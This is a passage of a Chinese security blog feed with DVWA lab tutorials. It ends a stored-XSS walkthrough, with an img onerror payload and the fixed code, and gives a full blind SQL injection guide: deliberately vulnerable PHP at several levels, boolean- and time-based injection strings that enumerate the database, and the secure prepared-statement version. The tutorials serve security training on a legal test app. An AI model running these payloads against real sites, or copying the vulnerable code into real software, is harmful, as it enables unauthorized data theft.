class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这里使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p><h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>抓包改name参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code>：</p><p><a href="http://image.3001.net/images/20161223/14824830099169.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824830099169.png!small" alt="1.png"></a></p><p>成功弹框：</p><p><a href="http://image.3001.net/images/20161223/1482483036879.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/1482483036879.png!small" alt="1.png"></a></p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之SQL Injection(Blind)</title>
    <link href="http://wlfsky.com/2018/01/18/DVWA%E4%B9%8BSQL-Injection-Blind/"/>
    <id>http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/</id>
    <published>2018-01-18T02:20:21.000Z</published>
    <updated>2018-01-19T07:32:50.741Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文参考自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a><strong>SQL Injection</strong> <strong>(Blind)</strong></h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><h3 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a><strong>手工盲注思路</strong></h3><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p><p>下面简要介绍手工盲注的步骤（可与之前的<a href="http://wlfsky.com/2018/01/17/DVWA之SQL-Injection">手工注入</a>作比较）：</p><blockquote><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>2.猜解当前数据库名</p><p>3.猜解数据库中的表名</p><p>4.猜解表中的字段名</p><p>5.猜解数据</p></blockquote><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID is MISSING from the database.</span><br></pre></td></tr></table></figure><p>，因此这里是SQL盲注漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>首先演示<strong>基于布尔的盲注</strong>：</p><h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，显示相应用户存在：</p><p><img src="/img/dvwa-sql-blind-1.png" alt="dvwa-sql-blind-1.png"></p><p>输入1’ and 1=1 #，显示存在：</p><p><img src="/img/dvwa-sql-blind-1.png" alt="dvwa-sql-blind-1.png"></p><p>输入1’ and 1=2 #，显示不存在：</p><p><img src="/img/dvwa-sql-blind-2.png" alt="dvwa-sql-blind-2.png"></p><p>说明存在字符型的SQL盲注。</p><h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><blockquote><p>输入1’ and length(database())=1 #，显示不存在；</p><p>输入1’ and length(database())=2 #，显示不存在；</p><p>输入1’ and length(database())=3 #，显示不存在；</p><p>输入1’ and length(database())=4 #，显示存在：</p></blockquote><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><blockquote><p>输入1’ and ascii(substr(database(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p><p>输入1’ and ascii(substr(database(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p><p>输入1’ and ascii(substr(database(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p><p>输入1’ and ascii(substr(database(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p><p>输入1’ and ascii(substr(database(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p><p>输入1’ and ascii(substr(database(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p><p>…</p></blockquote><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p><h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p><blockquote><p>1’ and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p><p>1’ and (select count(table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</p></blockquote><p>说明数据库中共有两个表。（注意：count和（table_name）中间不能有空格）</p><p>接着挨个猜解表名长度：</p><blockquote><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p><p>…</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</p></blockquote><p>说明第一个表名长度为9。</p><p>然后猜解表名：</p><blockquote><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p></blockquote><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p><h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p><blockquote><p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=1 # 显示不存在</p><p>…</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=8 # 显示存在</p></blockquote><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><blockquote><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p><p>…</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</p></blockquote><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p><p>还可以使用<strong>基于时间的盲注</strong>：</p><h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><blockquote><p>输入1’ and sleep(5) #，感觉到明显延迟；</p><p>输入1 and sleep(5) #，没有延迟；</p></blockquote><p>说明存在字符型的基于时间的盲注。</p><h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>首先猜解数据名的长度：</p><blockquote><p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</p></blockquote><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><blockquote><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p><p>…</p><p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p><p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p><p>说明数据库名的第一个字符为小写字母d。</p><p>…</p></blockquote><p>重复上述步骤，即可猜解出数据库名(dvwa)。</p><h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p><blockquote><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</p></blockquote><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><blockquote><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p></blockquote><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。</p><h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p><blockquote><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p><p>…</p><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</p></blockquote><p>说明users表中有8个字段。</p><p>接着挨个猜解字段长度：</p><blockquote><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</p></blockquote><p>说明users表的第一个字段长度为7个字符。</p><p>然后采用二分法即可猜解出各个字段名。</p><h3 id="5-猜解数据-1"><a href="#5-猜解数据-1" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p><img src="/img/dvwa-sql-13.png" alt="dvwa-sql-13.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p><p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p><p>首先是<strong>基于布尔的盲注</strong>：</p><blockquote><p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p><p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p><p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p></blockquote><p>然后是<strong>基于时间的盲注</strong>：</p><blockquote><p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p><p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p><p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p></blockquote><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Might sleep a random amount </span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123; </span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示<strong>基于布尔的盲注</strong>：</p><blockquote><p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p><p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p><p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p></blockquote><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        